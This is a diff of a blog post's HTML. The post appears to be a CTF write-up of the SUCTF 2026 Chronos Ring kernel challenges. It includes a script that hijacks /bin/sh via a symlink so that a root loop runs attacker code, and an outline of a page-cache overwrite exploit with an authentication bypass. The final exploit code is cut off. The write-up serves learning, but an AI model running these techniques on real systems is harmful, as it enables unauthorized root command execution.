@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -19,19 +19,19 @@
   <meta name="author" content="roxy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="hello kernel pwn!今天复盘一下爆零的SUCTF 并借此开启Kernel pwn的学习之旅 道阻且长，行则将至 参考WP: https:&#x2F;&#x2F;blog.xmcve.com&#x2F;2026&#x2F;03&#x2F;17&#x2F;SUCTF2026-Writeup&#x2F; https:&#x2F;&#x2F;0psu3.team&#x2F;2026&#x2F;03&#x2F;24&#x2F;SUCTF2026%20Writeup%20by%200psu3&#x2F;#SU-Chronos-Rin">
+    <meta name="description" content="hello kernel pwn! 今天复盘一下SUCTF 并借此开启Kernel pwn的学习之旅 参考WP: https:&#x2F;&#x2F;blog.xmcve.com&#x2F;2026&#x2F;03&#x2F;17&#x2F;SUCTF2026-Writeup&#x2F; https:&#x2F;&#x2F;0psu3.team&#x2F;2026&#x2F;03&#x2F;24&#x2F;SUCTF2026 Writeup by 0psu3&#x2F;#SU-Chronos-Ring1 SU_Chronos_Ring">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hello kernel pwn!">
 <meta property="og:url" content="https://rr00xxyy.github.io/2026/04/05/hello-kernel-pwn/index.html">
 <meta property="og:site_name" content="roxy&#39;s blog">
-<meta property="og:description" content="hello kernel pwn!今天复盘一下爆零的SUCTF 并借此开启Kernel pwn的学习之旅 道阻且长，行则将至 参考WP: https:&#x2F;&#x2F;blog.xmcve.com&#x2F;2026&#x2F;03&#x2F;17&#x2F;SUCTF2026-Writeup&#x2F; https:&#x2F;&#x2F;0psu3.team&#x2F;2026&#x2F;03&#x2F;24&#x2F;SUCTF2026%20Writeup%20by%200psu3&#x2F;#SU-Chronos-Rin">
+<meta property="og:description" content="hello kernel pwn! 今天复盘一下SUCTF 并借此开启Kernel pwn的学习之旅 参考WP: https:&#x2F;&#x2F;blog.xmcve.com&#x2F;2026&#x2F;03&#x2F;17&#x2F;SUCTF2026-Writeup&#x2F; https:&#x2F;&#x2F;0psu3.team&#x2F;2026&#x2F;03&#x2F;24&#x2F;SUCTF2026 Writeup by 0psu3&#x2F;#SU-Chronos-Ring1 SU_Chronos_Ring">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/131.png">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/132.png">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/133.png">
 <meta property="og:image" content="https://rr00xxyy.github.io/images/134.png">
 <meta property="article:published_time" content="2026-04-05T04:31:20.000Z">
-<meta property="article:modified_time" content="2026-04-15T16:03:27.539Z">
+<meta property="article:modified_time" content="2026-06-28T18:26:44.110Z">
 <meta property="article:author" content="roxy">
 <meta property="article:tag" content="Buffer">
 <meta property="article:tag" content="KASLR">
@@ -250,7 +250,7 @@
         
         
         
-          90 分钟
+          89 分钟
         
       </span>
     
@@ -292,25 +292,25 @@
             
               <div class="markdown-body">
                 
-                <h1 id="hello-kernel-pwn"><a href="#hello-kernel-pwn" class="headerlink" title="hello kernel pwn!"></a>hello kernel pwn!</h1><p>今天复盘一下<strong>爆零</strong>的<code>SUCTF</code></p>
+                <h1>hello kernel pwn!</h1>
+<p>今天复盘一下<code>SUCTF</code></p>
 <p>并借此开启<code>Kernel pwn</code>的学习之旅</p>
-<p>道阻且长，行则将至</p>
 <p>参考WP:</p>
 <p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2026/03/17/SUCTF2026-Writeup/">https://blog.xmcve.com/2026/03/17/SUCTF2026-Writeup/</a></p>
-<p><a target="_blank" rel="noopener" href="https://0psu3.team/2026/03/24/SUCTF2026%20Writeup%20by%200psu3/#SU-Chronos-Ring1">https://0psu3.team/2026/03/24/SUCTF2026%20Writeup%20by%200psu3/#SU-Chronos-Ring1</a></p>
-<h2 id="SU-Chronos-Ring"><a href="#SU-Chronos-Ring" class="headerlink" title="SU_Chronos_Ring"></a>SU_Chronos_Ring</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>做题之前</p>
+<p><a target="_blank" rel="noopener" href="https://0psu3.team/2026/03/24/SUCTF2026%20Writeup%20by%200psu3/#SU-Chronos-Ring1">https://0psu3.team/2026/03/24/SUCTF2026 Writeup by 0psu3/#SU-Chronos-Ring1</a></p>
+<h2 id="SU-Chronos-Ring">SU_Chronos_Ring</h2>
+<h3 id="前置">前置</h3>
+<p>做题之前</p>
 <p>首先要知道的一些前置知识:</p>
 <div class="note note-info">
             <p>仅为个人理解</p> 
           </div>
-
 <p>内核pwn不会真的让你去找内核的漏洞</p>
 <p>而是提供一个<code>.ko</code>文件，即<strong>LKM</strong>(Loadable Kernel Module，可加载内核模块)的编译产物</p>
-<p>你需要<strong>逆向</strong>这个文件，找到交互逻辑的漏洞点(ioctl，open，read，write，mmap，rcu，UAF…)</p>
+<p>你需要<strong>逆向</strong>这个文件，找到交互逻辑的漏洞点(ioctl，open，read，write，mmap，rcu，UAF...)</p>
 <div class="note note-secondary">
             <p><strong>LKM</strong>是指可以动态插入到<code>Linux</code>内核中(或从内核中卸载)的代码，用于扩展内核功能而不需要重新编译整个内核</p> <p>使用<code>lsmod</code>命令查看</p> 
           </div>
-
 <p>提供<code>initramfs.cpio.gz</code></p>
 <p>初始内存文件系统镜像(使用<code>cpio</code>打包并<code>gzip</code>压缩)</p>
 <p>内核启动时将其解压到内存作为根文件系统，其中包含必要的用户态程序(<code>/init</code>，<code>/bin/sh</code>等)，题目提供的可执行文件以及<code>flag</code>文件等</p>
@@ -320,96 +320,95 @@
 <p>在内核pwn中，分析<code>init</code>脚本往往是理解题目配置，定位漏洞触发条件的第一步</p>
 <p>解压步骤:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解压 gzip</span><br>gunzip initramfs.cpio.gz<br><span class="hljs-comment"># 创建临时目录并解包 cpio</span><br><span class="hljs-built_in">mkdir</span> initramfs_root<br><span class="hljs-built_in">cd</span> initramfs_root<br>cpio -idmv &lt; ../initramfs.cpio<br></code></pre></td></tr></table></figure>
-
 <p>区别于用户态pwn用python写exp</p>
 <p>内核态的pwn通常使用<code>c语言</code></p>
 <p>本地测试时:</p>
 <p><strong>静态链接编译</strong> + 将exp放入上面得到的<code>initramfs_root</code>文件系统的<code>/home/ctf</code>处(<strong>家目录</strong>) + 重新打包</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /challenge/</span><br>code exp.c<br>gcc -static -o exp exp.c<br><br><span class="hljs-comment"># /challenge/initramfs_root/</span><br><span class="hljs-built_in">cp</span> ../exp ./home/ctf/<br><br>find . | cpio -o -H newc | gzip &gt; ../initramfs.cpio.gz<br></code></pre></td></tr></table></figure>
-
 <p>本地gdb(pwndbg)调试，打远程方法，环境搭建</p>
 <p>待补充</p>
 <p>提供<code>run.sh</code></p>
 <p><code>qemu</code>启动脚本</p>
 <p>示例:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>TIMEOUT=300<br><br><span class="hljs-built_in">exec</span> <span class="hljs-built_in">timeout</span> --signal=KILL <span class="hljs-variable">$&#123;TIMEOUT&#125;</span> \<br>qemu-system-x86_64 \<br>    -m 96M \<br>    -nographic \<br>    -enable-kvm \<br>    -smp 2 \<br>    -cpu max \<br>    -kernel ./bzImage \<br>    -initrd ./initramfs.cpio.gz \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;console=ttyS0 kaslr no5lvl pti=on oops=panic panic=1 quiet&quot;</span> \<br>    -no-reboot<br></code></pre></td></tr></table></figure>
-
 <p>本地使用<code>sudo ./run.sh</code>启动challenge</p>
 <p>包含内核保护开启情况</p>
 <p>待补充</p>
 <div class="note note-primary">
-            <p>常用命令</p> <p>cat &#x2F;proc&#x2F;kallsyms</p> <p>id</p> <p>to be continued</p> 
+            <p>常用命令</p> <p>cat /proc/kallsyms</p> <p>id</p> <p>to be continued</p> 
           </div>
-
 <p>提供<code>bzImage</code></p>
 <p>编译好的<code>Linux</code>内核映像(压缩格式)</p>
 <p>提供<code>Dockerfile</code>，<code>docker-compose.yml</code>(maybe)</p>
 <p>我似乎止步于此了</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>启动challenge</p>
+<h3 id="exp">exp</h3>
+<p>启动challenge</p>
 <p><img src="/images/131.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>注意到<strong>bin竟然任何人都可写</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">drwxrwxrwx 2 ctf ctf 1940 Apr 5 05:16 bin<br></code></pre></td></tr></table></figure>
-
 <p>观察<code>init</code>脚本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">export</span> PATH=/bin:/sbin:/usr/bin:/usr/sbin<br>/bin/busybox --install -s<br><br><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&#x27;[ctf@SUCTF2026 \w]$ &#x27;</span><br><br><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs devtmpfs /dev<br>mount -t tmpfs tmpfs /tmp<br><br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br><span class="hljs-built_in">mkdir</span> -p /var/lock<br>mount -t devpts devpts /dev/pts || <span class="hljs-literal">true</span><br><br><br><span class="hljs-built_in">echo</span> SUCTF2026 &gt; /proc/sys/kernel/hostname<br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:x:0:0:root:/root:/bin/sh&#x27;</span> &gt; /etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&#x27;</span> &gt;&gt; /etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:x:0:&#x27;</span> &gt; /etc/group<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ctf:x:1000:&#x27;</span> &gt;&gt; /etc/group<br><br><span class="hljs-built_in">chmod</span> 644 /etc/passwd<br><span class="hljs-built_in">chmod</span> 644 /etc/group<br><br><span class="hljs-built_in">mkdir</span> -p /root<br><span class="hljs-built_in">mkdir</span> -p /home/ctf<br><span class="hljs-built_in">chown</span> 1000:1000 /home/ctf<br><span class="hljs-built_in">chmod</span> 777 /home/ctf<br><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/printk<br><br><span class="hljs-keyword">if</span> [ -e /flag ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">chown</span> root:root /flag<br>    <span class="hljs-built_in">chmod</span> 400 /flag<br><span class="hljs-keyword">fi</span><br><br><br>insmod /chronos_ring.ko<br><span class="hljs-built_in">chmod</span> 666 /dev/chronos_ring<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh&quot;</span> &gt; /tmp/job<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;echo &#x27;Root helper is running safely...&#x27;&quot;</span> &gt;&gt; /tmp/job<br><span class="hljs-built_in">chmod</span> 644 /tmp/job<br>(<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>        /bin/sh /tmp/job &gt; /dev/null 2&gt;&amp;1<br>        <span class="hljs-built_in">sleep</span> 3<br>    <span class="hljs-keyword">done</span><br>) &amp;<br><br><span class="hljs-built_in">echo</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;===============================================&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;   Welcome to SUCTF 2026: Chronos Ring         &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;            Please pwn!!!                      &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;===============================================&quot;</span><br><span class="hljs-built_in">echo</span><br><br><span class="hljs-built_in">export</span> HOME=/home/ctf<br><span class="hljs-built_in">export</span> TERM=dumb<br><span class="hljs-built_in">cd</span> /home/ctf<br><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v su &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exec</span> setsid cttyhack su ctf -s /bin/sh<br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">command</span> -v setuidgid &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exec</span> setsid cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[!] warning: no su/setuidgid found, fallback to root shell&quot;</span><br>    <span class="hljs-built_in">exec</span> setsid cttyhack /bin/sh<br><span class="hljs-keyword">fi</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 1 -n -f<br></code></pre></td></tr></table></figure>
-
 <p>注意到</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh&quot;</span> &gt; /tmp/job<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;echo &#x27;Root helper is running safely...&#x27;&quot;</span> &gt;&gt; /tmp/job<br><span class="hljs-built_in">chmod</span> 644 /tmp/job<br>(<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>        /bin/sh /tmp/job &gt; /dev/null 2&gt;&amp;1<br>        <span class="hljs-built_in">sleep</span> 3<br>    <span class="hljs-keyword">done</span><br>) &amp;<br></code></pre></td></tr></table></figure>
-
 <p>系统会不停地以<strong>root</strong>权限执行<code>/bin/sh /tmp/job</code></p>
 <p>不过<code>/tmp/job</code>似乎无害</p>
 <p>不过</p>
 <p>如果我们使用<strong>软链接</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /tmp/evil_sh /bin/sh<br></code></pre></td></tr></table></figure>
-
 <p>此时<code>/bin/sh</code>这个路径不再指向真正的shell，而是指向我们构造的恶意脚本<code>/tmp/evil_sh</code></p>
 <p>后台<code>root</code>循环下一次运行时，实际执行的便是:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/busybox sh /tmp/evil_sh /tmp/job<br></code></pre></td></tr></table></figure>
-
 <p>非预期解exp:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; /tmp/evil_sh &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">#!/bin/busybox sh</span><br><span class="hljs-string">cat /flag &gt; /home/ctf/flag.txt</span><br><span class="hljs-string">chmod 777 /home/ctf/flag.txt</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">chmod</span> +x /tmp/evil_sh<br><span class="hljs-built_in">ln</span> -sf /tmp/evil_sh /bin/sh<br></code></pre></td></tr></table></figure>
-
 <p>我们并没有直接<strong>提权</strong>，而是利用系统本身的行为，借root之手帮我们执行了一个读<code>/flag</code>的脚本，类似于<code>ret2dlresolve</code>的思想</p>
 <div class="note note-danger">
             <p><code>#</code>在shell里通常是注释，但<code>#!</code>放在文件第一行时叫<strong>shebang</strong>，是内核用来决定<strong>用哪个解释器执行这个脚本</strong>的特殊标记</p> <p>所以evil_sh第一行写<code>#!/bin/busybox sh</code></p> <p>意思是让内核用<code>/bin/busybox</code>来运行这个脚本，并让它在<code>sh</code>模式下解释脚本</p> <p>如果写成<code>#!/bin/sh</code></p> <p>在上面的<code>symlink</code>攻击中</p> <p>我们已经使用<strong>软链接</strong>将<code>/bin/sh</code>指向我们构造的恶意脚本</p> <p>这会导致循环解释错误的脚本(无限递归解释自己)</p> <p>直接崩溃</p> 
           </div>
-
 <p>因此给的<code>chronos_ring.ko</code>也不用逆了，直接获得了flag，出题者的小疏忽</p>
 <p><img src="/images/132.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
-<h2 id="SU-Chronos-Ring1"><a href="#SU-Chronos-Ring1" class="headerlink" title="SU_Chronos_Ring1"></a>SU_Chronos_Ring1</h2><p><strong>Okay, I made a mistake, please visit again</strong></p>
+<h2 id="SU-Chronos-Ring1">SU_Chronos_Ring1</h2>
+<p><strong>Okay, I made a mistake, please visit again</strong></p>
 <p>果不其然</p>
 <p>作者的小失误</p>
 <p>刚刚便算作是给我这种新手的入门小福利</p>
 <p>现在重启真正的内核pwn漏洞利用</p>
-<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>先逆向<code>chronos_ring.ko</code></p>
-<p>ps:我的逆向只能交给ai了…</p>
+<h3 id="逆向">逆向</h3>
+<p>先逆向<code>chronos_ring.ko</code></p>
 <p>漏洞来自<code>chronos_ioctl</code>模块</p>
 <p>有以下关键命令:</p>
 <ul>
-<li><p>0x1001 CMD_CREATE -&gt; Allocates a <code>kernel object</code> containing an internal 4 KB <strong>data buffer</strong> (initially a zero-filled page).</p>
+<li>
+<p>0x1001 CMD_CREATE -&gt; Allocates a <code>kernel object</code> containing an internal 4 KB <strong>data buffer</strong> (initially a zero-filled page).</p>
 </li>
-<li><p>0x1007 CMD_WRITE –&gt; Copies <strong>user‑supplied data</strong> into the object’s internal buffer at a given <code>offset</code> and <code>length</code>.</p>
+<li>
+<p>0x1007 CMD_WRITE –&gt; Copies <strong>user‑supplied data</strong> into the object’s internal buffer at a given <code>offset</code> and <code>length</code>.</p>
 </li>
-<li><p>0x1002 CMD_AUTH –&gt; Authenticates the caller by comparing a transformed value derived from the kernel’s <strong>kfree address</strong> with a <code>user‑provided key</code>; on success, sets a context flag (flags &amp; 1).</p>
+<li>
+<p>0x1002 CMD_AUTH –&gt; Authenticates the caller by comparing a transformed value derived from the kernel’s <strong>kfree address</strong> with a <code>user‑provided key</code>; on success, sets a context flag (flags &amp; 1).</p>
 </li>
-<li><p>0x1004 CMD_LOAD –&gt; Associates the object with a specific page of a given file, stores the <code>page cache</code> <code>page pointer</code>, and sets the object’s state to 1.</p>
+<li>
+<p>0x1004 CMD_LOAD –&gt; Associates the object with a specific page of a given file, stores the <code>page cache</code> <code>page pointer</code>, and sets the object’s state to 1.</p>
 </li>
-<li><p>0x1003 CMD_PIN –&gt; Pins a user‑space memory page using <code>pin_user_pages_fast</code> and sets another context flag (flags &amp; 2).</p>
+<li>
+<p>0x1003 CMD_PIN –&gt; Pins a user‑space memory page using <code>pin_user_pages_fast</code> and sets another context flag (flags &amp; 2).</p>
 </li>
-<li><p>0x1005 CMD_VIEW –&gt; Creates a <code>view</code> structure that either points to a newly allocated page or, if the object’s state is 1, points to the previously loaded file page; the view is then linked to the object.</p>
+<li>
+<p>0x1005 CMD_VIEW –&gt; Creates a <code>view</code> structure that either points to a newly allocated page or, if the object’s state is 1, points to the previously loaded file page; the view is then linked to the object.</p>
 </li>
-<li><p>0x1008 CMD_SYNC –&gt; Copies data from the object’s <strong>internal buffer</strong> into the <strong>physical page</strong> referenced by the current <strong>view</strong>; if the view backs a file page, the page is <strong>marked dirty</strong>.</p>
+<li>
+<p>0x1008 CMD_SYNC –&gt; Copies data from the object’s <strong>internal buffer</strong> into the <strong>physical page</strong> referenced by the current <strong>view</strong>; if the view backs a file page, the page is <strong>marked dirty</strong>.</p>
 </li>
-<li><p>0x1009 CMD_QUERY –&gt; Retrieves status information from the kernel object, including <code>context flags</code>, <code>object state</code>, <code>view type</code>, <code>page index</code>, and whether a file page is present; copies a 20‑byte structure to user space.</p>
+<li>
+<p>0x1009 CMD_QUERY –&gt; Retrieves status information from the kernel object, including <code>context flags</code>, <code>object state</code>, <code>view type</code>, <code>page index</code>, and whether a file page is present; copies a 20‑byte structure to user space.</p>
 </li>
 </ul>
 <p>其中，要执行<code>CMD_LOAD</code>要先通过<code>CMD_AUTH</code>的认证</p>
 <p>而同时，必须先<code>CMD_PIN</code>(固定一个用户页)才能成功执行<code>CMD_VIEW</code>，又必须先<code>CMD_VIEW</code>(创建指向文件页的视图)才能让<code>CMD_SYNC</code>将数据拷贝到目标文件页中</p>
 <p>一环套一环</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>思路是什么呢?</p>
+<h3 id="思路">思路</h3>
+<p>思路是什么呢?</p>
 <p>重点依旧是</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh&quot;</span> &gt; /tmp/job<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;echo &#x27;Root helper is running safely...&#x27;&quot;</span> &gt;&gt; /tmp/job<br><span class="hljs-built_in">chmod</span> 644 /tmp/job<br>(<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>        /bin/sh /tmp/job &gt; /dev/null 2&gt;&amp;1<br>        <span class="hljs-built_in">sleep</span> 3<br>    <span class="hljs-keyword">done</span><br>) &amp;<br></code></pre></td></tr></table></figure>
-
 <p>我们先创建一个内核对象(CMD_CREATE)，得到一个可读写的内部缓冲区<code>obj-&gt;data</code></p>
 <p>将恶意脚本写入该缓冲区(CMD_WRITE)</p>
 <p>通过认证(CMD_AUTH)以执行<code>CMD_LOAD</code></p>
@@ -419,18 +418,18 @@
 <p>将内部缓冲区的内容同步到视图指向的页(CMD_SYNC)，从而覆盖<code>/tmp/job</code>在内存中的内容为我们构造的恶意脚本</p>
 <p>等待<code>root</code>的后台任务执行被篡改的脚本，读取<code>flag</code></p>
 <p>核心依旧是利用系统本身的行为，借root之手执行任意命令</p>
-<h3 id="如何通过CMD-AUTH"><a href="#如何通过CMD-AUTH" class="headerlink" title="如何通过CMD_AUTH?"></a>如何通过CMD_AUTH?</h3><p>关键在于</p>
+<h3 id="如何通过CMD-AUTH">如何通过CMD_AUTH?</h3>
+<p>关键在于</p>
 <p>如何通过<code>CMD_AUTH</code></p>
 <p>类似于用户态的<code>ASLR</code></p>
 <p>由于内核态的保护机制<code>KASLR</code></p>
 <p>每次系统启动时，内核代码段，数据段，符号地址都会被加载到随机偏移的基址上，包括<code>kfree</code></p>
-<p><strong>内核地址 &#x3D; 固定基准 + 随机偏移量</strong></p>
+<p><strong>内核地址 = 固定基准 + 随机偏移量</strong></p>
 <p>如何泄露其地址呢?</p>
 <p>其实并不用</p>
 <p>观察认证逻辑</p>
 <p><img src="/images/133.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v61 ^ src ^ ((<span class="hljs-type">unsigned</span> __int64)&amp;kfree &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFE0000L</span>L) != <span class="hljs-number">0xF372FE94F82B3C6EL</span>L<br></code></pre></td></tr></table></figure>
-
 <p>其中<code>((uint64_t)&amp;kfree &gt;&gt; 4) &amp; 0xFFFFFFFFFFFE0000</code>，将<code>kfree</code>的地址右移4位，然后与<strong>掩码</strong><code>0xFFFFFFFFFFFE0000</code>做<strong>与运算</strong></p>
 <p>随后与用户程序可以自由控制的src(key)和v61(val)异或</p>
 <p>并判断结果是否等于一个固定常数</p>
@@ -441,17 +440,14 @@
 <div class="note note-info">
             <p>4096 - 0x1000 - 4KB</p> <p>0x200000 - 2MB</p> 
           </div>
-
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>最终exp:</p>
+<h3 id="exp-2">exp</h3>
+<p>最终exp:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 